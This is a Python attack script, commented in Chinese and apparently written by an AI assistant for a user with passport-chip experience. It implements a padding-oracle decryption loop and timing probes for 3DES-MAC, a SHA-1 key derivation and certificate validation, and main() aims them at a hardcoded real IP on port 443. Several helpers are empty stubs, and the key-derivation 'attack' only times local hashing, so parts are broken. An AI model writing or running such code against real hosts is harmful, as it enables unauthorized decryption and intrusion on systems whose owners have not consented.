#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级密码学攻击模块
基于passport实战经验的Web攻击
"""

import time
import socket
import ssl
import struct
import hashlib
from typing import List, Dict, Tuple, Optional
import numpy as np

class AdvancedCryptoAttacks:
    """基于Java Card经验的高级攻击"""
    
    def __init__(self, target_host: str, target_port: int):
        self.host = target_host
        self.port = target_port
        self.timing_samples = []
        
    # ========== 攻击1: ISO9797填充oracle（你的专长）==========
    
    def iso9797_padding_oracle(self, ciphertext: bytes) -> Optional[bytes]:
        """
        基于你处理ISO9797-1 Method 2的经验
        你知道0x80后面必须全是0x00
        """
        print("[*] ISO9797 Padding Oracle攻击")
        print("    利用你的safe_unpadding经验")
        
        def oracle(data: bytes) -> bool:
            """判断padding是否正确"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.host, self.port))
                
                # 构造包含密文的请求
                request = self.build_encrypted_request(data)
                sock.send(request)
                
                # 通过响应时间判断
                start = time.perf_counter()
                response = sock.recv(4096)
                elapsed = (time.perf_counter() - start) * 1000
                
                sock.close()
                
                # 基于你的经验：错误padding响应更快
                # 正确padding需要继续处理，错误立即返回
                return elapsed > 50  # 50ms阈值
                
            except:
                return False
        
        # 攻击核心算法
        block_size = 8  # 3DES
        blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
        
        plaintext = b''
        
        for block_idx in range(len(blocks) - 1, 0, -1):
            print(f"  攻击块 {block_idx}/{len(blocks)}")
            
            intermediate = bytearray(block_size)
            
            for byte_idx in range(block_size - 1, -1, -1):
                padding_value = block_size - byte_idx
                
                # 构造测试块
                test = bytearray(block_size)
                
                # 设置已知的intermediate值
                for j in range(byte_idx + 1, block_size):
                    test[j] = intermediate[j] ^ padding_value
                
                # 暴力破解当前字节
                found = False
                for guess in range(256):
                    test[byte_idx] = guess
                    
                    # 构造完整密文
                    test_cipher = bytes(test) + blocks[block_idx]
                    
                    if oracle(test_cipher):
                        # 特殊处理：避免0x80的误判（你的经验）
                        if byte_idx == block_size - 1 and padding_value == 1:
                            # 验证是否真的是0x01填充
                            test[byte_idx - 1] ^= 1
                            if not oracle(bytes(test) + blocks[block_idx]):
                                continue
                            test[byte_idx - 1] ^= 1
                        
                        intermediate[byte_idx] = guess ^ padding_value
                        print(f"    字节{byte_idx}: 0x{intermediate[byte_idx]:02x}")
                        found = True
                        break
                
                if not found:
                    print(f"    [!] 字节{byte_idx}破解失败")
                    return None
            
            # 解密块
            prev_block = blocks[block_idx - 1]
            plain_block = bytes(intermediate[i] ^ prev_block[i] for i in range(block_size))
            plaintext = plain_block + plaintext
        
        # 去除填充（使用你的safe_unpadding逻辑）
        return self.safe_unpad_iso9797(plaintext)
    
    def safe_unpad_iso9797(self, data: bytes) -> bytes:
        """你的safe_unpadding移植"""
        if not data:
            return data
        
        # 从尾部扫描（你的方法）
        i = len(data) - 1
        
        # 跳过0x00
        while i >= 0 and data[i] == 0x00:
            i -= 1
        
        # 检查0x80
        if i >= 0 and data[i] == 0x80:
            return data[:i]
        
        # 无效填充
        return data
    
    # ========== 攻击2: 3DES-MAC时序攻击 ==========
    
    def triple_des_mac_timing(self) -> Dict:
        """
        基于你的mac_iso9797_alg3实现
        3DES MAC的每一步都有时序特征
        """
        print("[*] 3DES-MAC时序分析")
        
        results = {
            'mac_block_processing_time': [],
            'key_schedule_time': 0,
            'vulnerable': False
        }
        
        # 测试不同长度的输入
        for length in [8, 16, 24, 32, 64, 128]:
            data = b'A' * length
            
            times = []
            for _ in range(50):
                start = time.perf_counter()
                
                # 发送需要MAC验证的请求
                self.send_mac_request(data)
                
                elapsed = (time.perf_counter() - start) * 1000
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            results['mac_block_processing_time'].append({
                'length': length,
                'blocks': length // 8,
                'avg_time': avg_time
            })
            
            print(f"  长度{length}: {avg_time:.2f}ms")
        
        # 分析是否线性（暴露了分块处理）
        times = [r['avg_time'] for r in results['mac_block_processing_time']]
        blocks = [r['blocks'] for r in results['mac_block_processing_time']]
        
        if len(set(blocks)) > 1:
            # 计算每块的处理时间
            time_diffs = [times[i+1] - times[i] for i in range(len(times)-1)]
            block_diffs = [blocks[i+1] - blocks[i] for i in range(len(blocks)-1)]
            
            per_block_times = [time_diffs[i]/block_diffs[i] for i in range(len(time_diffs)) if block_diffs[i] > 0]
            
            if per_block_times:
                avg_per_block = sum(per_block_times) / len(per_block_times)
                print(f"  [!] 每块处理时间: {avg_per_block:.2f}ms")
                
                if avg_per_block > 0.5:  # 软件实现
                    results['vulnerable'] = True
                    print("  [!] 检测到软件3DES实现，可能存在时序攻击！")
        
        return results
    
    def send_mac_request(self, data: bytes) -> bool:
        """发送需要MAC验证的请求"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            
            # 构造请求...
            sock.close()
            return True
        except:
            return False
    
    # ========== 攻击3: BAC密钥推导逆向 ==========
    
    def bac_key_derivation_attack(self, known_data: bytes) -> Optional[bytes]:
        """
        基于你的BAC实现，逆向密钥推导
        如果Web应用使用类似的KDF
        """
        print("[*] BAC风格密钥推导攻击")
        
        # BAC使用SHA-1和特定的推导方式
        # Kseed = SHA-1(MRZ_info)
        # Ka = SHA-1(Kseed || 00000001)
        # Kb = SHA-1(Kseed || 00000002)
        
        # 收集时序样本
        kdf_times = {}
        
        for seed_len in [16, 20, 32, 40]:
            seed = b'A' * seed_len
            
            times = []
            for _ in range(100):
                start = time.perf_counter()
                
                # 模拟KDF
                h1 = hashlib.sha1(seed + b'\x00\x00\x00\x01').digest()
                h2 = hashlib.sha1(seed + b'\x00\x00\x00\x02').digest()
                
                elapsed = (time.perf_counter() - start) * 1000000  # 微秒
                times.append(elapsed)
            
            kdf_times[seed_len] = sum(times) / len(times)
        
        # 分析时序特征
        print("  KDF时序特征：")
        for length, timing in kdf_times.items():
            print(f"    种子长度{length}: {timing:.2f}μs")
        
        # 检测是否使用了类似BAC的KDF
        if 20 in kdf_times and kdf_times[20] < kdf_times[32]:
            print("  [!] 可能使用SHA-1基础的KDF（类似BAC）")
            return self.attempt_kdf_reversal(known_data)
        
        return None
    
    def attempt_kdf_reversal(self, data: bytes) -> Optional[bytes]:
        """尝试逆向KDF"""
        # 这里可以用你的BAC经验
        # 比如已知密钥格式，逆推种子
        pass
    
    # ========== 攻击4: 证书链时序分析 ==========
    
    def cert_chain_timing_analysis(self) -> Dict:
        """
        基于你的unified_cert_chain.py经验
        证书验证的每一步都可能泄露信息
        """
        print("[*] 证书链验证时序分析")
        
        results = {
            'cert_validation_time': 0,
            'signature_verify_time': 0,
            'chain_depth': 0,
            'vulnerable_points': []
        }
        
        # 发送不同的证书场景
        test_cases = [
            ('valid_cert', self.get_valid_cert()),
            ('expired_cert', self.get_expired_cert()),
            ('wrong_signature', self.get_wrong_sig_cert()),
            ('untrusted_ca', self.get_untrusted_cert())
        ]
        
        for case_name, cert_data in test_cases:
            times = []
            
            for _ in range(50):
                start = time.perf_counter()
                
                # 发送证书进行验证
                self.send_cert_for_validation(cert_data)
                
                elapsed = (time.perf_counter() - start) * 1000
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            print(f"  {case_name}: {avg_time:.2f}ms")
            
            # 检测时序差异
            if case_name == 'wrong_signature' and avg_time < 10:
                results['vulnerable_points'].append('签名验证可能被跳过')
            elif case_name == 'expired_cert' and avg_time > 100:
                results['vulnerable_points'].append('过期检查在签名验证之后')
        
        return results
    
    def get_valid_cert(self) -> bytes:
        """获取有效证书（可以从你的cert生成代码）"""
        return b''
    
    def get_expired_cert(self) -> bytes:
        return b''
    
    def get_wrong_sig_cert(self) -> bytes:
        return b''
    
    def get_untrusted_cert(self) -> bytes:
        return b''
    
    def send_cert_for_validation(self, cert: bytes) -> bool:
        return True
    
    def build_encrypted_request(self, data: bytes) -> bytes:
        """构造加密请求"""
        return data

def main():
    """执行高级攻击"""
    target = "125.212.254.149"
    port = 443
    
    print("="*60)
    print("高级密码学攻击（基于Passport经验）")
    print("="*60)
    print(f"目标: {target}:{port}\n")
    
    attacker = AdvancedCryptoAttacks(target, port)
    
    # 1. 3DES-MAC时序
    mac_results = attacker.triple_des_mac_timing()
    if mac_results['vulnerable']:
        print("[!!!] 目标可能易受MAC时序攻击！")
    
    # 2. 证书链分析
    cert_results = attacker.cert_chain_timing_analysis()
    if cert_results['vulnerable_points']:
        print(f"[!!!] 发现证书验证漏洞: {cert_results['vulnerable_points']}")
    
    # 3. KDF分析
    attacker.bac_key_derivation_attack(b'test')
    
    print("\n" + "="*60)
    print("攻击完成")
    print("="*60)

if __name__ == "__main__":
    main()